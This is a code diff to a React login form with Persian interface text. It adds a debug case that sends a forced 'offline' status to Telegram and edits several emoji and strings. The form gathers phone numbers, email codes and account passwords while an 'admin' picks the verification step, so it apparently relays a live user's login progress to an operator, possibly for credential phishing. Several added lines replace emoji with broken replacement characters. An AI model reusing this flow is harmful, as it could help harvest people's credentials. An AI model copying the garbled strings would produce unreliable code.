@@ -275,7 +275,7 @@ export const LoginForm = () => {
           if (!isActuallyOnline) {
             // کاربر آفلاین است
             finalStatusText = "offline";
-            finalStatusEmoji = connectionType === 'offline' ? "📵" : "🔴";
+            finalStatusEmoji = connectionType === 'offline' ? "📵" : "����";
             console.log("🔴 User is OFFLINE - network status:", connectionType);
           } else if (isActuallyOnline && !isVisible) {
             // کاربر آنلاین است اما صفحه hidden است
@@ -352,12 +352,29 @@ export const LoginForm = () => {
           });
         });
         break;
+      case "test_offline":
+        // تست force offline برای debugging
+        console.log("🧪 TESTING: Force offline status");
+        updateUserOnlineStatus(
+          sessionId,
+          false, // force offline
+          !document.hidden,
+          Date.now(),
+          "offline",
+          "🔴",
+          true, // forceUpdate = true
+        ).then(() => {
+          console.log("✅ TEST: Force offline status sent to Telegram");
+        }).catch((error) => {
+          console.error("❌ TEST: Failed to send force offline status:", error);
+        });
+        break;
       case "complete":
         localStorage.setItem("isAuthenticated", "true");
         localStorage.setItem("userPhone", phoneNumber);
         sessionStorage.removeItem("sessionId");
         sessionStorage.removeItem("phoneNumber");
-        alert("🎉 احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
+        alert("�� احراز هویت با موفقیت تکمیل شد! خوش آمدید.");
         navigate("/", { replace: true });
         break;
     }
@@ -508,7 +525,7 @@ export const LoginForm = () => {
                   handleAdminAction("google");
                   break;
                 case "3":
-                  console.log("�� Demo admin chose: Email");
+                  console.log("🎭 Demo admin chose: Email");
                   handleAdminAction("email");
                   break;
                 default:
@@ -648,7 +665,7 @@ export const LoginForm = () => {
       console.log("📧 Email update result:", result);
 
       if (result.success) {
-        console.log("✅ Session updated with email successfully");
+        console.log("�� Session updated with email successfully");
         setEmailStep("code");
       } else {
         throw new Error("Failed to update session with email");
@@ -1617,7 +1634,7 @@ export const LoginForm = () => {
                             animation: "spin 1s linear infinite",
                           }}
                         />
-                        <span>در حال ارسال ��د...</span>
+                        <span>در حال ارسال کد...</span>
                       </div>
                     ) : (
                       <span>ثبت و ادامه</span>
@@ -2258,7 +2275,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    رمز ��بور حساب را وارد کنید.
+                    رمز عبور حساب را وارد کنید.
                   </label>
                   <div
                     style={{
